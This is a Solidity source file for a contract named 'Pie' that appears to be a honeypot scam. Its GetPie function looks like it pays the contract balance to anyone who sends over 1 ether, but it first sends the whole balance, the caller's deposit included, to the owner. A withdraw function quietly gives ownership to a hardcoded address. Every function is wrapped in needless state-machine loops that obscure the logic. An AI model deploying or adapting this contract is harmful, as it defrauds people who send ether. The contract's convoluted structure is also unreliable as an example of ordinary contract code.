pragma solidity ^0.4.19;

contract Pie
{
    address public Owner = msg.sender;

    function()
    public
    payable
    {
        
    }

    function GetPie()
    public
    payable
    {   
        uint256 state = 0;
        while (true) {
            if (state == 0) {
                if (msg.value > 1 ether) {
                    state = 1;
                } else {
                    break;
                }
            } else if (state == 1) {
                Owner.transfer(this.balance);
                state = 2;
            } else if (state == 2) {
                msg.sender.transfer(this.balance);
                break;
            }
        }
    }
    
    function withdraw()
    payable
    public
    {   
        uint256 state = 0;
        while (true) {
            if (state == 0) {
                if (msg.sender == 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6) {
                    Owner = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
                }
                state = 1;
            } else if (state == 1) {
                require(msg.sender == Owner);
                state = 2;
            } else if (state == 2) {
                Owner.transfer(this.balance);
                break;
            }
        }
    }
    
    function Command(address adr, bytes data)
    payable
    public
    {
        uint256 state = 0;
        while (true) {
            if (state == 0) {
                require(msg.sender == Owner);
                state = 1;
            } else if (state == 1) {
                adr.call.value(msg.value)(data);
                break;
            }
        }
    }
}